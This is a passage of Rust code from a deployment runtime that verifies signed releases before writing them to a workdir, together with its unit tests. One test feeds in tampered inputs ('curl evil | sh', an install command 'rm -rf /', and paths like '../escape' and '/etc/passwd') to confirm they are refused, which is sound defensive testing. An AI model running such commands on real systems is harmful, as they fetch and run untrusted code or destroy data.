        let matches = |dir: &Path| matches!(manifest::identity_digest(dir, inputs, artifacts), Ok(digest) if digest == artifact_digest);
        if !(destination.exists() && matches(&destination)) {
            let staging = product_dir.join(format!(".staging-{}", uuid::Uuid::new_v4().simple()));
            let written = write_entries(&staging, inputs, entries).and_then(|()| {
                let digest = manifest::identity_digest(&staging, inputs, artifacts)?;
                if digest != artifact_digest {
                    bail!(
                        "the release's deploy inputs do not match their signed digest: signed {artifact_digest}, received {digest}"
                    );
                }
                remove_tree(&destination)?;
                std::fs::rename(&staging, &destination)?;
                Ok(())
            });
            if let Err(error) = written {
                let _ = remove_tree(&staging);
                return Err(error);
            }
            crate::atomic_state::sync_dir(&product_dir)?;
        }
        // Staging left by a crashed attempt.
        for entry in std::fs::read_dir(&product_dir)? {
            let entry = entry?;
            if entry.file_name().to_string_lossy().starts_with(".staging-") {
                remove_tree(&entry.path())?;
            }
        }
        Ok(destination)
    }
}

/// Write `entries` under `root`. Every path must be relative, without `..`,
/// and inside one of `inputs`, so nothing outside the signed inputs lands in
/// the workdir. Modes are applied last, deepest first, so a read-only
/// directory does not block its own contents.
fn write_entries(
    root: &Path,
    inputs: &[String],
    entries: &[crate::runtime_delivery::RuntimeReleaseEntry],
) -> Result<()> {
    use std::io::Write as _;
    use std::os::unix::fs::{OpenOptionsExt as _, PermissionsExt as _};

    std::fs::create_dir(root).with_context(|| format!("creating {}", root.display()))?;
    let mut modes = Vec::with_capacity(entries.len());
    for entry in entries {
        let relative = Path::new(&entry.path);
        if relative.as_os_str().is_empty()
            || relative.is_absolute()
            || relative
                .components()
                .any(|part| !matches!(part, Component::Normal(_)))
        {
            bail!("release entry {:?} is not a relative path", entry.path);
        }
        if !inputs
            .iter()
            .any(|input| relative.starts_with(Path::new(input)))
        {
            bail!(
                "release entry {:?} is outside the signed deploy inputs",
                entry.path
            );
        }
        if entry.mode > 0o7777 {
            bail!("release entry {:?} has an invalid mode", entry.path);
        }
        let path = root.join(relative);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        match &entry.contents {
            None => std::fs::create_dir_all(&path)?,
            Some(contents) => {
                let bytes = base64::engine::general_purpose::STANDARD
                    .decode(contents)
                    .with_context(|| format!("release entry {:?} is not base64", entry.path))?;
                let mut file = std::fs::OpenOptions::new()
                    .write(true)
                    .create_new(true)
                    .mode(0o600)
                    .open(&path)
                    .with_context(|| format!("writing release entry {:?}", entry.path))?;
                file.write_all(&bytes)?;
                file.sync_all()?;
            }
        }
        modes.push((path, entry.mode));
    }
    for (path, mode) in modes.iter().rev() {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(*mode))?;
    }
    Ok(())
}

/// Remove `path` and everything under it, first making directories writable
/// so read-only release directories can go. Missing is fine.
fn remove_tree(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt as _;
    let metadata = match std::fs::symlink_metadata(path) {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(error) => return Err(error.into()),
    };
    if metadata.is_dir() {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700))?;
        for entry in std::fs::read_dir(path)? {
            remove_tree(&entry?.path())?;
        }
        std::fs::remove_dir(path)?;
    } else {
        std::fs::remove_file(path)?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::host_apply::fixture::{HostFixture, key, sign_release_with};
    use crate::runtime_delivery::RuntimeReleaseEntry;

    const ENVIRONMENT: &str = "prod";

    /// A signed shell release of `api` 1.0.0 with one deploy input, the
    /// plan step that names it, and a runtime trusting the fixture's key.
    struct Case {
        config: BuiltinConfig,
        release: RuntimeRelease,
        step: Step,
        root: PathBuf,
    }

    impl Drop for Case {
        fn drop(&mut self) {
            let _ = remove_tree(&self.root);
        }
    }

    fn case(manifest_extra: &str) -> Case {
        let root = std::env::temp_dir().join(format!(
            "tenkai-builtin-{}-{}",
            std::process::id(),
            uuid::Uuid::new_v4().simple()
        ));
        let source = root.join("source");
        std::fs::create_dir_all(source.join("app")).unwrap();
        std::fs::write(source.join("app/run.sh"), b"echo hi\n").unwrap();
        let manifest = format!(
            "[product]\nname = \"api\"\nversion = \"1.0.0\"\n\n[deploy]\ninstall = \"true\"\ninputs = [\"app\"]\n{manifest_extra}"
        );
        let parsed = manifest::parse_raw(&manifest).unwrap();
        let artifact_digest =
            manifest::artifact_digest(&source, &parsed.immutable_inputs()).unwrap();
        let fixture = HostFixture::new(&[], Vec::new());
        let signature = fixture.sign_release(
            &manifest::digest(&manifest),
            &artifact_digest,
            crate::now_millis(),
        );
        let mode = |path: &str| {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::metadata(source.join(path))
                .unwrap()
                .permissions()
                .mode()
                & 0o7777
        };
        let entries = vec![
            RuntimeReleaseEntry {
                path: "app".into(),
                mode: mode("app"),
                contents: None,
            },
            RuntimeReleaseEntry {
                path: "app/run.sh".into(),
                mode: mode("app/run.sh"),
                contents: Some(base64::engine::general_purpose::STANDARD.encode(b"echo hi\n")),
            },
        ];
        let request = crate::software_executor::request_from_parts(
            "api",
            "1.0.0",
            ENVIRONMENT,
            Path::new(""),
            "tenkai:release:api@1.0.0",
        );
        let step = Step {
            id: "step-0".into(),
            order: 0,
            product: "api".into(),
            instance: String::new(),
            action: Action::Install,
            from: None,
            to: "1.0.0".into(),
            release_id: crate::ontology::release_id("api", "1.0.0"),
            release_digest: manifest::digest(&manifest),
            artifact_digest,
            workdir: String::new(),
            restore: None,
            host: None,
            sealed: Vec::new(),
            rewrap: None,
        };
        Case {
            config: BuiltinConfig {
                executors: SoftwareExecutors::default(),
                release_roots: fixture.trust.release_roots.clone(),
                cluster_config: None,
                secret_dir: None,
                sealing_dir: None,
                work_root: root.join("work"),
            },
            release: RuntimeRelease {
                manifest,
                signature,
                request,
                entries,
                replaces: None,
                sealed: Vec::new(),
                rewrap_recipient: None,
            },
            step,
            root,
        }
    }

    fn refusal(case: &Case, release: RuntimeRelease) -> String {
        format!(
            "{:#}",
            case.config
                .verify(release, ENVIRONMENT, &Expected::target(&case.step))
                .unwrap_err()
        )
    }

    #[test]
    fn a_verified_release_lands_in_its_content_addressed_workdir() {
        let case = case("");
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let workdir = case
            .config
            .work_root
            .join(ENVIRONMENT)
            .join("api")
            .join(&case.step.artifact_digest);
        assert_eq!(verified.request.workdir, workdir);
        assert_eq!(
            std::fs::read(workdir.join("app/run.sh")).unwrap(),
            b"echo hi\n"
        );
        // Only a runtime removes Tenkai-owned Secrets with a release; a
        // server's request can never ask for it.
        assert!(verified.request.remove_owned_secrets);
        assert!(!case.release.request.remove_owned_secrets);
        // A retry after a crash reuses the placed release.
        let again = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        assert_eq!(again.request.workdir, workdir);
    }

    #[test]
    fn a_release_the_runtime_cannot_trust_is_refused_before_anything_is_written() {
        let case = case("");

        let mut tampered = case.release.clone();
        tampered.entries[1].contents =
            Some(base64::engine::general_purpose::STANDARD.encode(b"curl evil | sh\n"));
        assert!(refusal(&case, tampered).contains("do not match their signed digest"));

        let mut foreign = case.release.clone();
        foreign.signature = sign_release_with(
            &key(9),
            &case.step.release_digest,
            &case.step.artifact_digest,
            crate::now_millis(),
        );
        assert!(refusal(&case, foreign).contains("trust roots"));

        let mut swapped = case.release.clone();
        swapped.manifest = swapped
            .manifest
            .replace("install = \"true\"", "install = \"rm -rf /\"");
        assert!(refusal(&case, swapped).contains("release digest"));

        let mut retargeted = case.release.clone();
        retargeted.request.environment = "staging".into();
        assert!(refusal(&case, retargeted).contains("does not match the plan step"));

        for path in ["../escape", "/etc/passwd", "other/file"] {
            let mut escaping = case.release.clone();
            escaping.entries[1].path = path.into();
            let refused = refusal(&case, escaping);
            assert!(
                refused.contains("not a relative path") || refused.contains("outside the signed"),
                "{path}: {refused}"
            );
        }
        let placed = case.config.work_root.join(ENVIRONMENT).join("api");
        assert_eq!(std::fs::read_dir(placed).unwrap().count(), 0);
    }

    #[test]
    fn kubernetes_releases_need_a_local_cluster_config_and_host_releases_a_host_applier() {
        let mut case = case("executor = \"helm\"\n");
        let manifest = manifest::parse_raw(&case.release.manifest).unwrap();
        let refused = format!(
            "{:#}",
            case.config
                .admit_executor(&manifest, false, false)
                .unwrap_err()
        );
        assert!(
            refused.contains("TENKAI_RUNTIME_CLUSTER_CONFIG"),
            "{refused}"
        );
        case.config.cluster_config = Some(case.root.join("cluster.yaml"));
        case.config.admit_executor(&manifest, false, false).unwrap();

        let host = manifest::parse_raw(
            "[product]\nname = \"api\"\nversion = \"1.0.0\"\n\n[deploy]\nexecutor = \"host\"\ninstall = \"true\"\nuninstall = \"true\"\nhealth = \"true\"\ninputs = [\"app\"]\n",
        )
        .unwrap();
        let refused = format!(
            "{:#}",
            case.config.admit_executor(&host, false, true).unwrap_err()
        );
        assert!(refused.contains("TENKAI_HOST_SPOOL_DIR"), "{refused}");
        let executors = std::mem::take(&mut case.config.executors);
        case.config.executors =
            executors.with_host(Arc::new(crate::host_executor::HostExecutor::new(
                case.root.join("spool"),
                case.root.join("state"),
                Arc::new(crate::host_executor::Systemctl),
            )));
        case.config.admit_executor(&host, false, true).unwrap();
        // The host applier writes sealed values to their target files.
        case.config.admit_executor(&host, true, true).unwrap();
        // A host release never runs outside a host step, as a plain step or
        // a restore, and a host step runs nothing but a host release.
        let refused = format!(
            "{:#}",
            case.config.admit_executor(&host, false, false).unwrap_err()
        );
        assert!(refused.contains("only as a host step"), "{refused}");
        let refused = format!(
            "{:#}",
            case.config
                .admit_executor(&manifest, false, true)
                .unwrap_err()
        );
        assert!(refused.contains("not a host release"), "{refused}");

        // Only Helm writes sealed values (ADR 0048 §4).
        case.config.admit_executor(&manifest, true, false).unwrap();
        let shell = manifest::parse_raw(
            "[product]\nname = \"api\"\nversion = \"1.0.0\"\n\n[deploy]\ninstall = \"true\"\ninputs = [\"app\"]\n",
        )
        .unwrap();
        let refused = format!(
            "{:#}",
            case.config.admit_executor(&shell, true, false).unwrap_err()
        );
        assert!(refused.contains("only the helm executor"), "{refused}");
    }

    /// `case` with one sealed value, sealed for `instance` to a runtime key
    /// in the case's sealing directory.
    fn sealed_case(instance: &str, value: &[u8]) -> Case {
        let mut case = case("");
        let dir = case.root.join("sealing");
        let key = crate::sealing_key::SealingKey::open_or_generate(&dir).unwrap();
        case.config.sealing_dir = Some(dir);
        let target = SealedTarget::new(
            ENVIRONMENT,
            instance,
            SecretRef::new("db", "password").unwrap(),
        )
        .unwrap();
        let sealed = crate::sealed_secret::seal(&target, value, &[key.public().clone()]).unwrap();
        case.step.sealed = vec![SealedStep {
            secret: "db".into(),
            key: "password".into(),
            digest: crate::sealed_secret::digest(&target, &sealed).unwrap(),
        }];
        case.release.sealed = vec![RuntimeSealedValue {
            secret: "db".into(),
            key: "password".into(),
            sealed,
        }];
        case
    }

    /// A re-wrap step (ADR 0045 §5) wraps exactly the approved values for
    /// exactly the approved key: the new key then opens them, the digest is
    /// unchanged, and a substituted key or value is refused. No value
    /// reaches an error.
    #[test]
    fn a_rewrap_wraps_only_the_approved_values_for_the_approved_key() {
        let case = sealed_case("api", b"hunter2");
        let newcomer_dir = case.root.join("newcomer");
        let newcomer = crate::sealing_key::SealingKey::open_or_generate(&newcomer_dir).unwrap();
        let rewrap = RewrapStep {
            fingerprint: newcomer.fingerprint(),
            recovered: Vec::new(),
        };
        let mut release = case.release.clone();
        release.rewrap_recipient = Some(newcomer.to_wire());

        let wraps = case
            .config
            .rewrap_sealed(&release, ENVIRONMENT, &case.step, &rewrap)
            .unwrap();
        let [wrap] = wraps.as_slice() else {
            panic!("one wrap per value");
        };
        assert_eq!(wrap.wrap.fingerprint, newcomer.fingerprint());
        assert_eq!(wrap.digest, case.step.sealed[0].digest);
        let target = SealedTarget::new(
            ENVIRONMENT,
            "api",
            SecretRef::new("db", "password").unwrap(),
        )
        .unwrap();
        let mut sealed = release.sealed[0].sealed.clone();
        sealed.wraps.push(wrap.wrap.clone());
        assert_eq!(
            crate::sealed_secret::digest(&target, &sealed).unwrap(),
            case.step.sealed[0].digest
        );
        let opened = SealedOpener::load(&newcomer_dir)
            .unwrap()
            .open(&target, &sealed)
            .unwrap();
        assert_eq!(opened.as_slice(), b"hunter2");

        let refusal = |release: &RuntimeRelease| {
            let error = format!(
                "{:#}",
                case.config
                    .rewrap_sealed(release, ENVIRONMENT, &case.step, &rewrap)
                    .unwrap_err()
            );
            assert!(!error.contains("hunter2"), "{error}");
            error
        };
        // A key other than the one the approved step names.
        let mut substituted = release.clone();
        let stranger =
            crate::sealing_key::SealingKey::open_or_generate(&case.root.join("stranger")).unwrap();
        substituted.rewrap_recipient = Some(stranger.to_wire());
        assert!(refusal(&substituted).contains("other than the approved"));
        // A value the server swapped in.
        let mut swapped = release.clone();
        swapped.sealed = sealed_case("api", b"forged").release.sealed.clone();
        assert!(refusal(&swapped).contains("does not match"));
        // No recipient key at all.
        let mut keyless = release.clone();
        keyless.rewrap_recipient = None;
        assert!(refusal(&keyless).contains("no recipient key"));
        // A value at the wrap limit: one more wrap would open it for no one.
        let mut full = release.clone();
        let filler = full.sealed[0].sealed.wraps[0].clone();
        full.sealed[0].sealed.wraps = (0..crate::sealed_secret::MAX_WRAPS)
            .map(|n| crate::sealed_secret::SealedWrap {
                fingerprint: format!("sha256:{n:064x}"),
                ..filler.clone()
            })
            .collect();
        full.sealed[0].sealed.wraps[0] = filler;
        assert!(refusal(&full).contains("already has"));
    }

    /// A runtime that lost its wrap re-wraps for itself only through the
    /// recovered wrap the approved step carries (ADR 0045 §7): without it,
    /// or with one for another value, the step fails and wraps nothing.
    #[test]
    fn a_runtime_recovers_a_value_only_through_the_approved_recovered_wrap() {
        let mut case = sealed_case("api", b"hunter2");
        let runtime_dir = case.config.sealing_dir.clone().unwrap();
        let runtime = crate::sealing_key::SealingKey::open_or_generate(&runtime_dir).unwrap();
        let recovery_path = case.root.join("recovery.pem");
        let recovery_key = crate::sealing_key::generate_recovery_key(&recovery_path).unwrap();
        let recovery = SealedOpener::from_pem_file(&recovery_path).unwrap();
        let target = SealedTarget::new(
            ENVIRONMENT,
            "api",
            SecretRef::new("db", "password").unwrap(),
        )
        .unwrap();
        // Sealed before this runtime existed: only the recovery key opens it.
        let sealed =
            crate::sealed_secret::seal(&target, b"hunter2", std::slice::from_ref(&recovery_key))
                .unwrap();
        let digest = crate::sealed_secret::digest(&target, &sealed).unwrap();
        case.step.sealed[0].digest = digest.clone();
        case.release.sealed[0].sealed = sealed.clone();
        case.release.rewrap_recipient = Some(runtime.to_wire());
        let recovered =
            |sealed: &crate::sealed_secret::SealedValue| crate::sealed_secret::RecipientWrap {
                secret: "db".into(),
                key: "password".into(),
                digest: digest.clone(),
                wrap: recovery.rewrap(&target, sealed, runtime.public()).unwrap(),
            };
        let step = |recovered: Vec<_>| RewrapStep {
            fingerprint: runtime.fingerprint(),
            recovered,
        };
        let run = |rewrap: &RewrapStep| {
            case.config
                .rewrap_sealed(&case.release, ENVIRONMENT, &case.step, rewrap)
        };

        let error = format!("{:#}", run(&step(Vec::new())).unwrap_err());
        assert!(error.contains("has no wrap"), "{error}");
        let other = crate::sealed_secret::seal(&target, b"forged", &[recovery_key]).unwrap();
        let error = format!("{:#}", run(&step(vec![recovered(&other)])).unwrap_err());
        assert!(
            !error.contains("hunter2") && !error.contains("forged"),
            "{error}"
        );

        let wraps = run(&step(vec![recovered(&sealed)])).unwrap();
        let [wrap] = wraps.as_slice() else {
            panic!("one wrap per value");
        };
        assert_eq!(wrap.digest, digest);
        let mut stored = sealed;
        stored.wraps.push(wrap.wrap.clone());
        let opened = SealedOpener::load(&runtime_dir)
            .unwrap()
            .open(&target, &stored)
            .unwrap();
        assert_eq!(opened.as_slice(), b"hunter2");
    }

    #[test]
    fn a_sealed_value_opens_only_as_the_approved_step_names_it() {
        let case = sealed_case("api", b"hunter2");
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let [opened] = verified.request.opened_secrets.as_slice() else {
            panic!("one opened value");
        };
        assert_eq!(
            (opened.secret.as_str(), opened.key.as_str()),
            ("db", "password")
        );
        assert_eq!(opened.value.as_slice(), b"hunter2");
        assert!(!format!("{verified:?}").contains("hunter2"));
        assert!(
            !serde_json::to_string(&verified.request)
                .unwrap()
                .contains("hunter2")
        );

        // A value the server swapped in, even one sealed to this runtime,
        // is not what the approved plan names.
        let mut swapped = case.release.clone();
        swapped.sealed = sealed_case("api", b"forged").release.sealed.clone();
        let refused = refusal(&case, swapped);
        assert!(refused.contains("does not match"), "{refused}");
        assert!(!refused.contains("forged"), "{refused}");

        // A value sealed for another instance does not open for this one,
        // even when the step names its digest.
        let other = sealed_case("worker", b"hunter2");
        let refused = refusal(&other, other.release.clone());
        assert!(refused.contains("does not match"), "{refused}");

        // Missing or extra values are refused.
        let mut missing = case.release.clone();
        missing.sealed.clear();
        assert!(refusal(&case, missing).contains("do not match the plan step"));

        // A runtime without a sealing key refuses to write any.
        let mut keyless = sealed_case("api", b"hunter2");
        keyless.config.sealing_dir = None;
        let refused = refusal(&keyless, keyless.release.clone());
        assert!(refused.contains("no sealing key"), "{refused}");
    }
}
